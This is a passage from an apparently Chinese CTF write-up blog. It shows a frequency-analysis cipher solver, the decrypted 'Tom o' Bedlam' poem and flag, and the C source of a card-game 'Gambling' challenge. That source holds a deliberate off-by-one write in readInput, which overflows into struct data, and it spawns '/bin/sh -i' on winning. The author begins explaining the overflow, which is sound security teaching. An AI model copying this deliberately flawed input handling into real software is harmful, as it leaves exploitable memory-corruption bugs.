freq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    key_min_length, key_max_length = <span class="number">1</span>, <span class="number">50</span></span><br><span class="line">    freq = <span class="number">0</span></span><br><span class="line">    key = <span class="string">''</span></span><br><span class="line">    plain = <span class="string">''</span></span><br><span class="line">    cipher = GetCipher(<span class="string">'cipher.txt'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key_size <span class="keyword">in</span> range(key_min_length, key_max_length):</span><br><span class="line">        _plain, _key, _freq = Decrypt(key_size, cipher)</span><br><span class="line">        <span class="keyword">if</span> _freq &gt; freq:</span><br><span class="line">            freq, key, plain = _freq, _key, _plain</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] Frequency: '</span> + str(freq)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] Key: '</span> + key</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] Plain:\n'</span> + plain</span><br><span class="line">    <span class="keyword">print</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'flag&#123;%s&#125;'</span> % key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>最后解密出的plain是一首诗（可能会有几个字母没对上）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">From the hag and hungry goblin</span><br><span class="line">That into rags would rend ye</span><br><span class="line">The spirit that stands by the naked man</span><br><span class="line">In the Book of Moons defend ye</span><br><span class="line">That of your five sound senses</span><br><span class="line">You never be forsaken</span><br><span class="line">Nor wander from your selves with Tom</span><br><span class="line">Abroad to beg your bacon</span><br><span class="line">While I do sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">Of thirty bare years have I</span><br><span class="line">Twice twenty been enraged</span><br><span class="line">And of forty been three times fifteen</span><br><span class="line">In durance soundly caged</span><br><span class="line">On the lordly lofts of Bedlam</span><br><span class="line">With stubble soft and dainty</span><br><span class="line">Brave bracelets strong sweet whips ding dong</span><br><span class="line">With wholesome hunger plenty</span><br><span class="line">And now I sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">With a thought I took for Maudlin</span><br><span class="line">And a cruse of cockle pottage</span><br><span class="line">With a thing thus tall sky bless you all</span><br><span class="line">I befell into this dotage</span><br><span class="line">I slept not since the Conquest</span><br><span class="line">Till then I never waked</span><br><span class="line">Till the roguish boy of love where I lay</span><br><span class="line">Me found and stript me naked</span><br><span class="line">While I do sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">When I short have shorn my sows face</span><br><span class="line">And swigged my horny barrel</span><br><span class="line">In an oaken inn I pound my skin</span><br><span class="line">As a suit of gilt apparel</span><br><span class="line">The moons my constant mistress</span><br><span class="line">And the lovely owl my marrow</span><br><span class="line">The flaming drake and the night crow make</span><br><span class="line">Me music to my sorrow</span><br><span class="line">While I do sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">The palsy plagues my pulses</span><br><span class="line">When I prig your pigs or pullen</span><br><span class="line">Your culvers take or matchless make</span><br><span class="line">Your Chanticleer or Sullen</span><br><span class="line">When I want provant with Humphry</span><br><span class="line">I sup and when benighted</span><br><span class="line">I repose in Pauls with waking souls</span><br><span class="line">Yet never am affrighted</span><br><span class="line">But I do sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">I know more than Apollo</span><br><span class="line">For oft when he lies sleeping</span><br><span class="line">I see the stars at mortal wars</span><br><span class="line">In the wounded welkin weeping</span><br><span class="line">The moon embrace her shepherd</span><br><span class="line">And the Queen of Love her warrior</span><br><span class="line">While the first doth horn the star of morn</span><br><span class="line">And the next the heavenly Farrier</span><br><span class="line">While I do sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">The Gypsies Snap and Pedro</span><br><span class="line">Are none of Toms comradoes</span><br><span class="line">The punk I scorn and the cutpurse sworn</span><br><span class="line">And the roaring boys bravadoes</span><br><span class="line">The meek the white the gentle</span><br><span class="line">Me handle not nor spare not</span><br><span class="line">But those that cross Tom Rynosseross</span><br><span class="line">Do what the panther dare not</span><br><span class="line">Although I sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">With an host of furious fancies</span><br><span class="line">Whereof I am commander</span><br><span class="line">With a burning spear and a horse of air</span><br><span class="line">To the wilderness I wander</span><br><span class="line">By a knight of ghosts and shadows</span><br><span class="line">I summoned am to tourney</span><br><span class="line">Ten leagues beyond the wide worlds end</span><br><span class="line">Methinks it is no journey</span><br><span class="line">Yet I will sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br></pre></td></tr></table></figure><p>解出的flag为</p><blockquote><p>flag{1_dO_n0oooooot_L1k3_Cryp7ogr4phy}</p></blockquote><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Gambling"><a href="#Gambling" class="headerlink" title="Gambling"></a>Gambling</h2><p>题目源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAMEBUFFLEN 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BETBUFFLEN 8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">card</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> suit;</span><br><span class="line">    <span class="keyword">char</span> value;</span><br><span class="line">&#125; card;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">deck</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> deckSize;</span><br><span class="line">    <span class="keyword">size_t</span> top;</span><br><span class="line">    card cards[<span class="number">52</span>];</span><br><span class="line">&#125; deck;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">player</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> money;</span><br><span class="line">    deck playerCards;</span><br><span class="line">&#125; player;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">gameState</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> playerMoney;</span><br><span class="line">  player ctfer;</span><br><span class="line">  <span class="keyword">char</span> name[NAMEBUFFLEN];</span><br><span class="line">  <span class="keyword">size_t</span> deckSize;</span><br><span class="line">  player opponent;</span><br><span class="line">&#125; gameState;</span><br><span class="line"></span><br><span class="line">gameState gameData;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Shuffles the deck</span></span><br><span class="line"><span class="comment">//Make sure to call srand() before!</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shuffle</span><span class="params">(deck * inputDeck)</span></span>&#123;</span><br><span class="line">    card temp;</span><br><span class="line">    <span class="keyword">size_t</span> indexA, indexB;</span><br><span class="line">    <span class="keyword">size_t</span> deckSize = inputDeck-&gt;deckSize;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)&#123;</span><br><span class="line">        indexA = rand() % deckSize;</span><br><span class="line">        indexB = rand() % deckSize;</span><br><span class="line">        temp = inputDeck-&gt;cards[indexA];</span><br><span class="line">        inputDeck-&gt;cards[indexA] = inputDeck-&gt;cards[indexB];</span><br><span class="line">        inputDeck-&gt;cards[indexB] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Checks if a card is in invalid range</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">checkInvalidCard</span><span class="params">(card * inputCard)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(inputCard-&gt;suit &gt; <span class="number">4</span> || inputCard-&gt;value &gt; <span class="number">14</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Reads input from user, and properly terminates the string</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">readInput</span><span class="params">(<span class="keyword">char</span> * buff, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">while</span>((c = getchar()) != <span class="string">'\n'</span> &amp;&amp; c != EOF)&#123;</span><br><span class="line">        <span class="keyword">if</span>(count &lt; (len<span class="number">-1</span>))&#123;</span><br><span class="line">            buff[count] = c;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    buff[count+<span class="number">1</span>] = <span class="string">'\x00'</span>;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Builds the deck for each player.</span></span><br><span class="line"><span class="comment">//Good luck trying to win ;)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildDecks</span><span class="params">(player * ctfer, player * opponent)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">            ctfer-&gt;playerCards.cards[j*<span class="number">4</span> + i].suit = i;</span><br><span class="line">            ctfer-&gt;playerCards.cards[j*<span class="number">4</span> + i].value = j+<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">            opponent-&gt;playerCards.cards[j*<span class="number">4</span> + i].suit = i;</span><br><span class="line">            opponent-&gt;playerCards.cards[j*<span class="number">4</span> + i].value = j+<span class="number">9</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">24</span>].suit = <span class="number">0</span>;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">24</span>].value = <span class="number">8</span>;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">25</span>].suit = <span class="number">1</span>;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">25</span>].value = <span class="number">8</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">24</span>].suit = <span class="number">2</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">24</span>].value = <span class="number">8</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">25</span>].suit = <span class="number">3</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">25</span>].value = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    ctfer-&gt;playerCards.deckSize = <span class="number">26</span>;</span><br><span class="line">    ctfer-&gt;playerCards.top = <span class="number">0</span>;</span><br><span class="line">    opponent-&gt;playerCards.deckSize = <span class="number">26</span>;</span><br><span class="line">    opponent-&gt;playerCards.top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> betStr[BETBUFFLEN];</span><br><span class="line">    card * oppCard;</span><br><span class="line">    card * playCard;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;gameData, <span class="number">0</span>, <span class="keyword">sizeof</span>(gameData));</span><br><span class="line">    gameData.playerMoney = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> bet;</span><br><span class="line"></span><br><span class="line">    buildDecks(&amp;gameData.ctfer, &amp;gameData.opponent);</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));<span class="comment">//Not intended to be cryptographically strong</span></span><br><span class="line"></span><br><span class="line">    shuffle(&amp;gameData.ctfer.playerCards);</span><br><span class="line">    shuffle(&amp;gameData.opponent.playerCards);</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Set to be the smaller of the two decks.</span></span><br><span class="line">    gameData.deckSize = gameData.ctfer.playerCards.deckSize &gt; gameData.opponent.playerCards.deckSize</span><br><span class="line"> ? gameData.opponent.playerCards.deckSize : gameData.ctfer.playerCards.deckSize;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter your name: \n"</span>);</span><br><span class="line">    <span class="built_in">memset</span>(gameData.name,<span class="number">0</span>,NAMEBUFFLEN);</span><br><span class="line">    <span class="keyword">if</span>(!readInput(gameData.name,NAMEBUFFLEN))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Read error. Exiting.\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome %s\n"</span>, gameData.name);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">size_t</span> playerIndex = gameData.ctfer.playerCards.top;</span><br><span class="line">        <span class="keyword">size_t</span> oppIndex = gameData.opponent.playerCards.top;</span><br><span class="line">        oppCard = &amp;gameData.opponent.playerCards.cards[oppIndex];</span><br><span class="line">        playCard = &amp;gameData.ctfer.playerCards.cards[playerIndex];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You have %d coins.\n"</span>, gameData.playerMoney);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"How much would you like to bet?\n"</span>);</span><br><span class="line">        <span class="built_in">memset</span>(betStr,<span class="number">0</span>,BETBUFFLEN);</span><br><span class="line">        <span class="keyword">if</span>(!readInput(betStr,BETBUFFLEN))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Read error. Exiting.\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        bet = atoi(betStr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"you bet %d.\n"</span>,bet);</span><br><span class="line">        <span class="keyword">if</span>(!bet)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Invalid bet\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(bet &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"No negative betting for you!\n"</span>);</span><br><span class="line">           <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(bet &gt; gameData.playerMoney)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"You don't have much.\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"The opponent has a %d of suit %d.\n"</span>, oppCard-&gt;value, oppCard-&gt;suit);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You have a %d of suit %d.\n"</span>, playCard-&gt;value, playCard-&gt;suit);</span><br><span class="line">        <span class="keyword">if</span>((playCard-&gt;value * <span class="number">4</span> + playCard-&gt;suit) &gt; (oppCard-&gt;value * <span class="number">4</span> + playCard-&gt;suit))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Something must be wrong...\n"</span>);</span><br><span class="line">            <span class="keyword">if</span>(checkInvalidCard(playCard))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"That's not actually a valid card.\n"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"You won!\n"</span>);</span><br><span class="line">                gameData.playerMoney += bet;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"You lost!\n"</span>);</span><br><span class="line">            gameData.playerMoney -= bet;</span><br><span class="line">        &#125;</span><br><span class="line">        gameData.ctfer.playerCards.top++;</span><br><span class="line">        gameData.opponent.playerCards.top++;</span><br><span class="line">        <span class="keyword">if</span>(gameData.playerMoney &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"You are out of coins. Game over.\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(gameData.playerMoney &gt; <span class="number">500</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"You won the game!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh -i"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//<span class="doctag">TODO:</span> Implement card switching hands. Cheap hack here for playability</span></span><br><span class="line">        gameData.deckSize--;</span><br><span class="line">        <span class="keyword">if</span>(gameData.deckSize == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"All card used.\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这到题比较偏向于Pwn，但是鄙人还是把它归类于Misc，此题仅仅考察了结构体中的数据溢出的问题<br>首先可以看到源码中内置了一个shell，我们的目标就是赢得游戏，拿到这个shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(gameData.playerMoney &lt;= <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"You are out of coins. Game over.\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(gameData.playerMoney &gt; <span class="number">500</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"You won the game!\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/sh -i"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其余代码就不具体分析了，存在溢出的结构体为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">gameState</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> playerMoney;</span><br><span class="line">player ctfer;</span><br><span class="line"><span class="keyword">char</span> name[NAMEBUFFLEN];</span><br><span class="line"><span class="keyword">size_t</span> deckSize;</span><br><span class="line">player opponent;</span><br><span class="line">&#125; gameState;</span><br></pre></td></tr></table></figure><p>宏中定义了name数组的大小NAMEBUFFLEN为32，但是再看存储玩家输入的name的时候代码做了什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Enter your name: \n"</span>);</span><br><span class="line"><span class="built_in">memset</span>(gameData.name,<span class="number">0</span>,NAMEBUFFLEN);</span><br><span class="line"><span class="keyword">if</span>(!readInput(gameData.name,NAMEBUFFLEN))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read error. Exiting.\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到调用readInput给gameData中的name数组存入了NAMEBUFFLEN大小的name，继续跟进readInput</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Reads input from user, and properly terminates the string</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">readInput</span><span class="params">(<span class="keyword">char</span> * buff, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span 